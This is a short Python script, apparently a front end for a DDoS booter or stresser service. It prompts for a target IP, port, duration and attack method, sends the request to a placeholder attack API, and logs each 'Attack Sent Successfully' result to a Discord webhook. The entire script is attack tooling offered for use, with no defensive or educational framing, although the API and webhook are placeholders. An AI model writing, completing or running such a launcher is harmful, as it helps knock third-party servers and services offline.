# ===================================================================================
# Created By     : x_4rch4n63l_x 
# Created On     : 9/2/2024 - 8:03PM
# Script Purpose : Stress Test / Attack Script
# Description    : This script sends HTTP requests to the specified target IP and port
#                  for the given duration.                 
# Features       : 
#                  - Sends HTTP requests to a target.
#                  - Allows customization of attack duration and method.
#                  - Logs attack information to Discord webhook.        
#                  
# Requirements   : 
#                  - Python 3.x
#                  - requests library (pip install requests)
# ===================================================================================
import requests
from datetime import datetime

banner = """
[ Normal methods ]

"""

print(banner)

username = ''
password = ''

discord_webhook_url = 'WEBHOOK_URL'

def send_discord_message(title, description, color):
    data = {
        "embeds": [
            {
                "title": title,
                "description": description,
                "color": color
            }
        ]
    }
    response = requests.post(discord_webhook_url, json=data)
    if response.status_code == 204:
        print("Log sent to Discord successfully!")
    else:
        print(f"Failed to send log to Discord. Status Code: {response.status_code}")

def validate_input(ip, port, duration, method):
    if not ip or not port or not duration or not method:
        return False
    if not port.isdigit() or not duration.isdigit():
        return False
    return True

def send_attack(ip, port, duration, method):

    start_time = datetime.now()

    api_url = f"API-URL-HERE"

    response = requests.get(api_url)

    end_time = datetime.now()

    total_duration = (end_time - start_time).total_seconds()


    if response.status_code == 200:
        print("Attack Sent Successfully!")
        send_discord_message(
            title="Attack Sent Successfully!",
            description=(
                f"Target : {ip} - Port : {port}\n"
                f"Duration : {duration} seconds\n"
                f"Method : {method}\n"
                f"Start Time : {start_time.strftime('%Y-%m-%d %H:%M:%S')}\n"
                f"End Time : {end_time.strftime('%Y-%m-%d %H:%M:%S')}\n"
                f"Total Duration : {total_duration:.2f} seconds"
            ),
            color=3066993  # Green
        )
    else:
        print("Failed To Send Attack. Please Check The Inputs And Try Again.")
        send_discord_message(
            title="Failed to Send Attack",
            description=(
                f"Target : {ip} - Port : {port}\n"
                f"Please check the inputs and try again."
            ),
            color=15158332  # Red
        )

def main():
    print("Options:")
    print("1. Send Attack Now")

    choice = input("Choose an option (1) : ")

    ip = input("Enter Target IP : ")
    port = input("Enter Target Port : ")
    duration = input("Enter Attack Duration : ")
    method = input("Enter Attack Method : ")

    if validate_input(ip, port, duration, method):
        if choice == '1':
            send_attack(ip, port, duration, method)
        else:
            print("Invalid choice. Please select 1.")
    else:
        print("Invalid input. Please check your entries and try again.")

if __name__ == '__main__':
    main()
